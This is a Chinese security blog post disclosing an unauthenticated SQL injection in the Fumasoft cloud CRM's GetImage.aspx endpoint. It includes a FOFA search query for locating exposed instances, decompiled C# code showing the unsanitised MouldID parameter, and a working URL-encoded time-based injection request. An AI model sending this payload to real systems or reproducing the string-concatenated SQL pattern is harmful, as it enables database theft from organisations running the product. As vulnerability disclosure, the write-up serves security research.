---
title: "孚盟云CRM GetImage.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html
asset_dir: assets/孚盟云crm-getimage.aspx-sql注入漏洞
---

# 孚盟云CRM GetImage.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/17 08:30
* 1167浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

SaaS

软件

app


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetImage.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetImage.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetImage` 方法的实现如下

```
public class GetImage : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    try
    {
      string str1 = this.Request.QueryString["MouldID"];
      string str2 = this.Request.QueryString["pkField"];
      string str3 = this.Request.QueryString["Field"];
      string str4 = Base64.base64Decode(this.Request.QueryString[str2]);
      string str5 = this.Request.QueryString["SqlNo"];
      if (string.IsNullOrEmpty(str5))
        str5 = "1";
      string str6 = this.dbHelper.Query($"select TableName from syMouldTables where MouldID='{str1}' and SqlNo={str5} and IsUpdate=1").Tables[0].Rows[0][0].ToString();
      byte[] numArray = this.dbHelper.Query($"select {str3} from {str6} where {str2}={str4}").Tables[0].Rows[0][0] as byte[];
      MemoryStream memoryStream = new MemoryStream(numArray);
      this.Response.Clear();
      this.Response.ContentType = "image/gif";
      this.Response.OutputStream.Write(numArray, 0, numArray.Length);
      this.Response.End();
```

深入探索

网络安全培训

企业安全咨询

Nessus

未经过滤或参数化绑定的参数 `MouldID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetImage.aspx SQL注入漏洞](images/img-001-e4c4c87f1d61.webp)](https://image.mrxn.net/ebeb899e8d6a45869e3a5f8badd4914b.webp)

成功延时 5 秒

SQL注入检测工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM GetImage.aspx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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